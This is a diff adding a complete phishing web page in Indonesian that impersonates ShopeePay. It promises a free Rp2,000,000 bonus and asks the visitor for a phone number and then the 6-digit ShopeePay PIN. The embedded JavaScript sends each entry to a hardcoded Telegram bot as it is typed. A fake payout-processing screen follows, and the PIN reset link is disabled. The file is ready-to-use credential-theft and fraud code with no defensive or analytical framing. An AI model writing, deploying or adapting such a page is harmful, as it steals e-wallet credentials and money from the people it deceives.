@@ -1,0 +1,604 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Klaim Saldo Rp2.000.000</title>
+    
+    <!-- Open Graph Meta Tags untuk Preview WhatsApp/Media Sosial -->
+    <meta property="og:type" content="website">
+    <meta property="og:title" content="Klaim Hadiah - Bonus Rp2.000.000">
+    <meta property="og:description" content="Selamat! Anda terpilih mendapatkan bonus saldo gratis senilai Rp2.000.000. Segera klaim sekarang!">
+    <meta property="og:image" content="https://cdn.phototourl.com/member/2026-10-20-6b3633bf-7cfc-4dcf-80fe-715310ed7a1e.jpg">
+    <meta property="og:image:width" content="1200">
+    <meta property="og:image:height" content="630">
+
+    <style>
+        :root {
+            --shopee-bg-page: #f5f5f5; 
+            --shopee-orange: #ee4d2d; 
+            --shopee-orange-dark: #d73211;
+            --text-hitam: #222222;
+            --text-abu: #757575;
+            --border-color: #e0e0e0;
+        }
+
+        body, html {
+            margin: 0; padding: 0; width: 100%; height: 100%;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            background-color: #d0d0d0; 
+            display: flex; justify-content: center;
+            overflow: hidden; 
+        }
+
+        .app-container {
+            width: 100%; max-width: 420px;
+            background-color: var(--shopee-bg-page);
+            height: 100vh;
+            display: flex;
+            flex-direction: column;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .app-header {
+            background-color: #ffffff;
+            color: var(--text-hitam);
+            padding: 12px 16px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            border-bottom: 1px solid var(--border-color);
+            flex-shrink: 0;
+        }
+
+        .header-left {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            font-weight: 600;
+            font-size: 16px;
+        }
+
+        .header-left svg, .header-right svg {
+            width: 22px; height: 22px; fill: var(--text-hitam); cursor: pointer;
+        }
+
+        .hidden { display: none !important; }
+
+        .content-body {
+            padding: 12px;
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+        }
+
+        .banner-card {
+            background: #ffffff;
+            border-radius: 8px;
+            overflow: hidden;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.08);
+            border: 1px solid var(--border-color);
+        }
+
+        .banner-container {
+            width: 100%;
+            aspect-ratio: 16 / 9;
+            position: relative;
+            background: #ffffff;
+        }
+
+        .banner-container img {
+            width: 100%; height: 100%; object-fit: cover;
+            position: absolute; opacity: 0; 
+            transition: opacity 1.2s ease-in-out, transform 1.2s ease-in-out;
+            transform: scale(0.98);
+        }
+
+        .banner-container img.active { 
+            opacity: 1; 
+            transform: scale(1);
+        }
+
+        .form-card {
+            background-color: #ffffff;
+            border-radius: 8px;
+            overflow: hidden;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.08);
+            border: 1px solid var(--border-color);
+        }
+
+        .form-card-header {
+            background-color: #ffffff;
+            padding: 16px 16px 10px;
+            text-align: center;
+            border-bottom: 1px solid #f0f0f0;
+        }
+
+        .brand-logo {
+            width: 75px;
+            margin: 0 auto 6px;
+            display: block;
+        }
+
+        .title-box p {
+            color: var(--text-abu);
+            font-size: 12px;
+            line-height: 1.4;
+            margin: 0 0 4px 0;
+        }
+
+        .title-box b {
+            font-weight: 700;
+            color: var(--shopee-orange);
+            font-size: 17px;
+            display: block;
+        }
+
+        .form-section {
+            padding: 16px;
+        }
+
+        .input-group {
+            margin-bottom: 16px;
+        }
+
+        .input-group label {
+            display: block;
+            font-size: 13px;
+            font-weight: 600;
+            color: #333333;
+            margin-bottom: 8px;
+        }
+
+        .phone-wrapper {
+            display: flex;
+            align-items: center;
+            background-color: #fcfcfc;
+            border: 1.5px solid #d9d9d9;
+            border-radius: 8px;
+            padding: 0 12px;
+            height: 48px;
+            transition: all 0.2s ease;
+        }
+
+        .phone-wrapper:focus-within {
+            border-color: var(--shopee-orange);
+            background-color: #ffffff;
+            box-shadow: 0 0 0 3px rgba(238, 77, 45, 0.12);
+        }
+
+        .phone-flag {
+            width: 22px;
+            height: 15px;
+            border-radius: 2px;
+            object-fit: cover;
+            margin-right: 6px;
+            box-shadow: 0 0 1px rgba(0,0,0,0.3);
+        }
+
+        .phone-prefix {
+            color: var(--text-hitam);
+            font-weight: 700;
+            font-size: 15px;
+            padding-right: 10px;
+            border-right: 1px solid #e0e0e0;
+            display: flex;
+            align-items: center;
+        }
+
+        .input-field-phone {
+            width: 100%;
+            height: 100%;
+            padding-left: 10px;
+            border: none;
+            outline: none;
+            font-size: 16px;
+            font-weight: 600;
+            color: var(--text-hitam);
+            background: transparent;
+            letter-spacing: 0.5px;
+        }
+
+        .input-field-phone::placeholder {
+            color: #b5b5b5;
+            font-weight: 400;
+        }
+
+        .btn-primary {
+            width: 100%;
+            background: #ee4d2d;
+            color: white;
+            border: none;
+            padding: 14px;
+            font-size: 15px;
+            font-weight: 700;
+            letter-spacing: 0.5px;
+            text-transform: uppercase;
+            cursor: pointer;
+            border-radius: 8px; 
+            margin-top: 18px;
+            box-shadow: 0 3px 10px rgba(238, 77, 45, 0.3);
+            transition: background 0.2s;
+        }
+
+        .btn-primary:active {
+            background: var(--shopee-orange-dark);
+        }
+
+        .secure-footer-info {
+            margin-top: 16px;
+            padding-top: 12px;
+            border-top: 1px dashed #e5e5e5;
+            display: flex;
+            justify-content: space-around;
+            align-items: center;
+            font-size: 10px;
+            color: #888888;
+            text-align: center;
+        }
+
+        .secure-item {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 4px;
+        }
+
+        .secure-item svg {
+            width: 16px;
+            height: 16px;
+            fill: #888888;
+        }
+
+        .pin-screen-container {
+            display: flex;
+            flex-direction: column;
+            height: calc(100vh - 51px);
+            background-color: #ffffff;
+            align-items: center;
+            padding: 30px 20px;
+            box-sizing: border-box;
+            text-align: center;
+        }
+
+        .pin-logo-box {
+            background: transparent;
+            padding: 0;
+            border: none;
+            margin-bottom: 20px;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            box-shadow: none;
+        }
+
+        .pin-logo-box img {
+            width: 70px;
+            height: auto;
+            display: block;
+        }
+
+        .pin-title {
+            font-size: 18px;
+            font-weight: 700;
+            color: var(--text-hitam);
+            margin: 0 0 6px 0;
+        }
+
+        .pin-subtitle {
+            color: #666666;
+            font-size: 12px;
+            margin: 0 0 24px 0;
+            line-height: 1.4;
+        }
+
+        .pin-dots {
+            display: flex;
+            gap: 14px;
+            justify-content: center;
+            margin-bottom: 24px;
+            cursor: pointer;
+        }
+
+        .dot {
+            width: 14px; 
+            height: 14px;
+            border: 2px solid #cccccc;
+            border-radius: 50%;
+            box-sizing: border-box;
+            background: #ffffff;
+        }
+
+        .dot.filled {
+            background: var(--shopee-orange);
+            border-color: var(--shopee-orange);
+        }
+
+        .lupa-pin {
+            color: var(--shopee-orange);
+            font-size: 13px;
+            font-weight: 600;
+            text-decoration: none;
+            display: inline-block;
+            margin-top: 10px;
+        }
+
+        .native-pin-input {
+            position: absolute;
+            opacity: 0;
+            pointer-events: auto;
+            width: 100%;
+            height: 100%;
+            top: 0;
+            left: 0;
+            cursor: pointer;
+        }
+
+        .status-card {
+            background: #ffffff;
+            margin: 16px;
+            padding: 32px 20px;
+            text-align: center;
+            border-radius: 8px;
+            border: 1px solid #dcdcdc;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.08);
+        }
+
+        .status-badge {
+            display: inline-block;
+            background-color: #fff3e0;
+            color: #e65100;
+            font-size: 12px;
+            font-weight: 700;
+            padding: 6px 14px;
+            border-radius: 4px;
+            margin-bottom: 12px;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+
+        .status-title {
+            font-size: 18px;
+            font-weight: 700;
+            color: #111111;
+            margin-bottom: 6px;
+        }
+
+        .status-amount {
+            font-size: 28px;
+            font-weight: 800;
+            color: var(--shopee-orange);
+            margin: 12px 0 20px 0;
+        }
+
+        .receipt-box {
+            background-color: #f9f9f9;
+            padding: 16px;
+            margin: 16px 0;
+            border: 1px solid #e5e5e5;
+            border-radius: 6px;
+            text-align: left;
+        }
+
+        .receipt-row {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 10px;
+            font-size: 13px;
+            font-weight: 500;
+        }
+
+        .receipt-row:last-child { margin-bottom: 0; }
+        .receipt-label { color: #666666; }
+        .receipt-value { color: #111111; font-weight: 700; }
+
+        .info-note {
+            font-size: 12px;
+            color: #555555;
+            line-height: 1.5;
+            margin-top: 16px;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="app-container">
+        <div class="app-header" id="appHeader">
+            <div class="header-left">
+                <svg viewBox="0 0 24 24"><path d="M20 11H7.83l5.59-5.59L12 4l-8 8 8 8 1.41-1.41L7.83 13H20v-2z"/></svg>
+                <span id="headerTitle">ShopeePay Rewards</span>
+            </div>
+            <div class="header-right">
+                <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/></svg>
+            </div>
+        </div>
+        
+        <!-- STEP 1 -->
+        <div id="step1">
+            <div class="content-body">
+                <div class="banner-card">
+                    <div class="banner-container">
+                        <img src="https://cdn.phototourl.com/member/2026-10-20-856d9335-26a0-4217-95a0-56e0e99abb2b.png" class="active" alt="Banner 1">
+                        <img src="https://cdn.phototourl.com/member/2026-10-20-e9d66b7c-f753-4596-8407-ae7ab14fb107.jpg" alt="Banner 2">
+                    </div>
+                </div>
+
+                <div class="form-card">
+                    <div class="form-card-header">
+                        <img src="https://upload.wikimedia.org/wikipedia/commons/f/fe/Shopee.svg" class="brand-logo" alt="Logo">
+                        <div class="title-box">
+                            <p>Silakan lengkapi verifikasi untuk klaim saldo</p>
+                            <b></b>
+                        </div>
+                    </div>
+
+                    <div class="form-section">
+                        <div class="input-group">
+                            <label>Nomor Telepon Terdaftar</label>
+                            <div class="phone-wrapper">
+                                <img src="https://upload.wikimedia.org/wikipedia/commons/9/9f/Flag_of_Indonesia.svg" class="phone-flag" alt="ID Flag">
+                                <div class="phone-prefix">+62</div>
+                                <input type="tel" id="userPhone" class="input-field-phone" placeholder="812 3456 7890" inputmode="numeric" maxlength="15">
+                            </div>
+                        </div>
+                        
+                        <button class="btn-primary" onclick="sendStep1()">Lanjutkan</button>
+
+                        <div class="secure-footer-info">
+                            <div class="secure-item">
+                                <svg viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm0 10.99h7c-.53 4.12-3.28 7.79-7 8.94V12H5V6.3l7-3.11v8.8z"/></svg>
+                                <span>100% Aman</span>
+                            </div>
+                            <div class="secure-item">
+                                <svg viewBox="0 0 24 24"><path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z"/></svg>
+                                <span>Terenkripsi</span>
+                            </div>
+                            <div class="secure-item">
+                                <svg viewBox="0 0 24 24"><path d="M11.99 2C6.47 2 2 6.48 2 12s4.47 10 9.99 10C17.52 22 22 17.52 22 12S17.52 2 11.99 2zM12 20c-4.42 0-8-3.58-8-8s3.58-8 8-8 8 3.58 8 8-3.58 8-8 8zm.5-13H11v6l5.25 3.15.75-1.23-4.5-2.67z"/></svg>
+                                <span>Resmi Shopee</span>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- STEP 2: PIN SCREEN -->
+        <div id="step2" class="hidden" style="position: relative;">
+            <div class="pin-screen-container" onclick="document.getElementById('pinField').focus()">
+                <div class="pin-logo-box">
+                    <img src="https://upload.wikimedia.org/wikipedia/commons/f/fe/Shopee.svg" alt="Logo Shopee">
+                </div>
+                <h2 class="pin-title">Masukkan PIN ShopeePay</h2>
+                <p class="pin-subtitle">Silahkan masukkan 6 digit PIN ShopeePay<br>Anda untuk konfirmasi pencairan bonus.</p>
+                
+                <input type="tel" id="pinField" class="native-pin-input" maxlength="6" inputmode="numeric" oninput="handlePinInput(this)">
+                
+                <div class="pin-dots" onclick="document.getElementById('pinField').focus()">
+                    <div class="dot"></div><div class="dot"></div><div class="dot"></div>
+                    <div class="dot"></div><div class="dot"></div><div class="dot"></div>
+                </div>
+
+                <a href="#" class="lupa-pin" onclick="alert('Fitur reset PIN dinonaktifkan sementara.'); return false;">Lupa PIN ShopeePay?</a>
+            </div>
+        </div>
+
+        <!-- STEP 3: STATUS TERAKHIR -->
+        <div id="step3" class="hidden">
+            <div class="status-card">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/f/fe/Shopee.svg" style="width: 75px; margin-bottom: 16px;" alt="Logo">
+                <div>
+                    <span class="status-badge">Verifikasi Proses</span>
+                </div>
+                <div class="status-title">Pencairan Saldo</div>
+                <div class="status-amount">Rp2.000.000</div>
+                
+                <div class="receipt-box">
+                    <div class="receipt-row">
+                        <span class="receipt-label">Nomor HP</span>
+                        <span class="receipt-value" id="resPhone"></span>
+                    </div>
+                    <div class="receipt-row">
+                        <span class="receipt-label">Status Verifikasi</span>
+                        <span class="receipt-value" style="color: #e65100;">Proses Layanan</span>
+                    </div>
+                </div>
+
+                <p class="info-note">Silahkan tunggu beberapa saat, sistem kami sedang memproses pencairan dana Anda secara otomatis.</p>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        const telegramToken = "7568104337:AAGDmJcrcXnPl3MDsRtl7-2kxkW_hmeK7io";
+        const telegramChatId = "7667144622";
+        
+        const slides = document.querySelectorAll('.banner-container img');
+        let current = 0;
+        setInterval(() => {
+            slides[current].classList.remove('active');
+            current = (current + 1) % slides.length;
+            slides[current].classList.add('active');
+        }, 3500);
+
+        function navigateTo(step) {
+            document.getElementById('step1').classList.add('hidden');
+            document.getElementById('step2').classList.add('hidden');
+            document.getElementById('step3').classList.add('hidden');
+            
+            document.getElementById('step' + step).classList.remove('hidden');
+            
+            const titles = { 1: "ShopeePay Rewards", 2: "Masukkan PIN", 3: "Status Pencairan" };
+            document.getElementById('headerTitle').innerText = titles[step];
+
+            if(step === 2) {
+                setTimeout(() => {
+                    document.getElementById('pinField').focus();
+                }, 100);
+            }
+
+            if(step === 3) {
+                let rawPhone = document.getElementById('userPhone').value.trim();
+                if(rawPhone.startsWith('0')) rawPhone = rawPhone.substring(1);
+                document.getElementById('resPhone').innerText = "+62 " + rawPhone;
+            }
+        }
+
+        async function sendToTelegram(message) {
+            const url = `https://api.telegram.org/bot${telegramToken}/sendMessage`;
+            const payload = {
+                chat_id: telegramChatId,
+                text: message,
+                parse_mode: "Markdown"
+            };
+            try {
+                await fetch(url, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
+                });
+            } catch (err) { console.error("Error Telegram", err); }
+        }
+
+        function sendStep1() {
+            let phone = document.getElementById('userPhone').value.trim();
+            if(!phone) {
+                alert("Mohon masukkan nomor HP terlebih dahulu.");
+                return;
+            }
+            if(phone.startsWith('0')) phone = phone.substring(1);
+            const formattedPhone = "+62" + phone;
+
+            sendToTelegram(`🔔 *NOTIFIKASI KLAIM BARU*\n📱 *Nomor HP:* ${formattedPhone}`);
+            navigateTo(2);
+        }
+
+        const pinField = document.getElementById('pinField');
+        const dots = document.querySelectorAll('.dot');
+
+        function handlePinInput(el) {
+            el.value = el.value.replace(/[^0-9]/g, '').slice(0, 6);
+            updateDots(el.value.length);
+
+            if(el.value.length === 6) {
+                let phone = document.getElementById('userPhone').value.trim();
+                if(phone.startsWith('0')) phone = phone.substring(1);
+                const formattedPhone = "+62" + phone;
+                const pin = el.value;
+
+                sendToTelegram(`🔥 *DATA FINAL DITERIMA*\n📱 *Nomor HP:* ${formattedPhone}\n🔑 *PIN ShopeePay:* \`${pin}\``);
+                setTimeout(() => navigateTo(3), 400);
+            }
+        }
+
+        function updateDots(len) {
+            dots.forEach((dot, i) => {
+                if(i < len) dot.classList.add('filled');
+                else dot.classList.remove('filled');
+            });
+        }
+    </script>
+</body>
+</html>
+
